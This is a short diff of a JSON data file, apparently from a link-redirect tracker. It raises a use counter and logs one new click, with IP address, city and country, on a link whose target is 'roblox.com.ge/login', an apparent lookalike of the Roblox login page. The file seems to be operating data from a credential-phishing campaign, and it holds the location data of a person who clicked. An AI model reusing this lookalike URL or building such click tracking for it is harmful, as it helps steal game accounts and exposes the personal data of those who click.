@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1381,
+    "useCount": 1382,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11216,6 +11216,14 @@
         "city": "San Jacinto",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777423611959,
+        "ip": "111.90.247.184",
+        "country": "Philippines",
+        "city": "Davao City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
